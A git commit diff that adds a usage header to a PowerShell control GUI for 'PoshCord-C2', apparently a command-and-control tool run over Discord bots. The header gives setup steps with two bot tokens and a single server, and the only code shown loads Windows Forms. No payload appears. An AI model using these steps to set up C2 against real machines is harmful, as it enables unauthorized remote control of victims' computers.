de37e0ec06f2d4e94c6f349ef232fd027dffbcd5
egieb <93350544+beigeworm@users.noreply.github.com>
2024-07-15 19:52:46 +0000

    Update Poshcord-Control-GUI.ps1

--- Server/Poshcord-Control-GUI.ps1
+++ Server/Poshcord-Control-GUI.ps1
@@ -1,3 +1,21 @@
+
+<# ============================== PoshCord-C2 Control ===================================
+**SYNOPSIS**
+This script creates a GUI for receiving the info stream from one Poshcord-C2 client.
+
+**USAGE**
+1. Replace TOKEN_1 with the main token. (the token used for the client)
+2. Create a SECOND bot with the same permissions as the client bot and add it to the same server.
+3. Replace TOKEN_2 with the token you just created (used for sending messages like a user)
+4. Run the script to create the Control GUI
+
+**IMPORTANT**
+- Both bots must only be in ONE Server ONLY.
+- Run This Script AFTER starting the client session
+- Only one set of client channels can be in the server (delete clossed sessions in discord after use).
+============================================================================================
+#>
+
 Add-Type -AssemblyName System.Windows.Forms
 Add-Type -AssemblyName System.Drawing
 [System.Windows.Forms.Application]::EnableVisualStyles()
